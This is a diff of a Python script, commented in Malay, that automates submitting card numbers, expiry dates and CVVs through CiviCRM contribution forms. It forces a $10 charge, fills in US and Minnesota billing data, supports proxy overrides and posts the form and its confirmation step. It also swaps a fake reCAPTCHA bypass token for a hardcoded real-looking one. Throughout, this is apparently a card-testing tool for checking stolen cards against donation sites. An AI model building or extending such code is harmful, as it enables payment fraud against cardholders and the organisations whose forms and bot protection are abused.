@@ -309,102 +309,43 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
     
     final_payload["qfKey"] = qfkey
     final_payload["entryURL"] = base_url.replace("&amp;", "&")
-    
-    # INJECT FAKE CAPTCHA TOKEN
-    final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
+    final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
 
     if is_confirm:
+        # Hardcoded 100% sama seperti confirmation page yang awak bg
         final_payload["_qf_default"] = "Confirm:next"
-        final_payload["_qf_Confirm_next"] = "1"
         final_payload["email_work"] = ""
+        final_payload["custom_1"] = "2026"
+        final_payload["custom_3"] = ""
+        final_payload["_qf_Confirm_next"] = "1"
     else:
+        # Hardcoded 100% sama seperti initial page yang awak bg
+        final_payload["hidden_processor"] = "1"
+        final_payload["payment_processor_id"] = "4"
+        final_payload["priceSetId"] = "3"
+        final_payload["selectProduct"] = ""
         final_payload["_qf_default"] = "Main:upload"
         final_payload["zip_billing"] = ""
-        submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
-        final_payload[submit_name] = raw_payload.get('_submit_button_value', '1')
-
-    if '_detected_payment_processor_id' in raw_payload:
-        proc_id = raw_payload['_detected_payment_processor_id'].get('value', '4')
-        final_payload['payment_processor_id'] = proc_id
-
-    price_selected = False
-
-    for key, field_info in raw_payload.items():
-        if key in ['_detected_payment_processor_id', '_form_action', '_submit_button_name', '_submit_button_value']: continue
-        if not isinstance(field_info, dict): continue
-
-        field_type = field_info.get('type', 'text')
-        options = field_info.get('options', [])
-        current_value = field_info.get('value', '')
-        key_lower = key.lower()
-
-        if 'stripe' in key_lower or 'token' in key_lower or 'paypal' in key_lower: continue
-        if field_type in ['submit', 'button', 'image']: continue
-
-        # OVERRIDE FIELD PENTING SAHAJA
-        if 'hidden_processor' in key_lower:
-            final_payload[key] = "1"
-            continue
-        if key == 'price_2':
-            final_payload[key] = "10"
-            price_selected = True
-            continue
-        if key == 'custom_1':
-            final_payload[key] = "2026"
-            continue
-
-        if field_type == 'radio' or field_type == 'checkbox':
-            if 'price' in key_lower or 'amount' in key_lower:
-                if not price_selected:
-                    final_payload[key] = "10"
-                    price_selected = True
-                else:
-                    final_payload[key] = '0'
-            else:
-                if 'recurring' in key_lower or 'recur' in key_lower: 
-                    final_payload[key] = '0'
-                else: 
-                    final_payload[key] = current_value
-            continue
-
-        if field_type == 'select':
-            if 'state' in key_lower or 'province' in key_lower: 
-                final_payload[key] = "1022" # Force Minnesota
-            elif 'country' in key_lower: 
-                final_payload[key] = '1228' # Force US
-            elif 'card' in key_lower and 'type' in key_lower: 
-                final_payload[key] = scheme
-            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): 
-                final_payload[key] = full_year
-            elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): 
-                final_payload[key] = str(input_month)
-            else:
-                final_payload[key] = current_value if current_value else (options[0] if options else "")
-            continue
-
-        if field_type == 'hidden':
-            if isinstance(current_value, str):
-                final_payload[key] = current_value.replace("&amp;", "&")
-            continue
-
-        if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): final_payload[key] = ccnum
-        elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): final_payload[key] = cvv
-        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
-        elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
-        elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
-        
-        elif 'first' in key_lower and 'name' in key_lower: final_payload[key] = user_data['first_name']
-        elif 'last' in key_lower and 'name' in key_lower: final_payload[key] = user_data['last_name']
-        elif 'middle' in key_lower and 'name' in key_lower: final_payload[key] = user_data['middle_name']
-        elif 'email' in key_lower: final_payload[key] = user_data['email']
-        elif 'street' in key_lower or 'address' in key_lower or 'addr1' in key_lower or 'line_1' in key_lower: final_payload[key] = user_data['street_address']
-        elif 'city' in key_lower: final_payload[key] = user_data['city']
-        elif 'zip' in key_lower or 'postal' in key_lower: final_payload[key] = user_data['postal_code']
-        elif 'phone' in key_lower or 'tel' in key_lower or 'mobile' in key_lower: final_payload[key] = user_data['phone']
-        else:
-            if not current_value:
-                continue
-            final_payload[key] = current_value
+        final_payload["MAX_FILE_SIZE"] = "536870912"
+        final_payload["price_2"] = "10"
+        final_payload["email-5"] = user_data['email']
+        final_payload["custom_1"] = "2026"
+        final_payload["custom_2"] = ""
+        final_payload["custom_3"] = ""
+        final_payload["credit_card_type"] = scheme
+        final_payload["credit_card_number"] = ccnum
+        final_payload["cvv2"] = cvv
+        final_payload["credit_card_exp_date[M]"] = str(input_month)
+        final_payload["credit_card_exp_date[Y]"] = full_year
+        final_payload["billing_first_name"] = user_data['first_name']
+        final_payload["billing_middle_name"] = ""
+        final_payload["billing_last_name"] = user_data['last_name']
+        final_payload["billing_street_address-5"] = user_data['street_address']
+        final_payload["billing_city-5"] = user_data['city']
+        final_payload["billing_country_id-5"] = "1228"
+        final_payload["billing_state_province_id-5"] = "1022"
+        final_payload["billing_postal_code-5"] = user_data['postal_code']
+        final_payload["_qf_Main_upload"] = "1"
 
     return final_payload
 
@@ -451,14 +392,10 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
                 if input_qfkey: qfkey = input_qfkey.get('value', qfkey)
 
-                confirm_hidden = extract_confirmation_form(response.text, soup_resp)
+                # Kita tak perlu extract field lain, sebab build_clean_payload dah hardcoded
+                # confirm_hidden = extract_confirmation_form(response.text, soup_resp)
                 
-                merged_payload = raw_payload.copy()
-                if confirm_hidden:
-                    for k, v in confirm_hidden.items():
-                        merged_payload[k] = v
-
-                clean_confirm = build_clean_payload(merged_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
+                clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
                 confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
                 
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
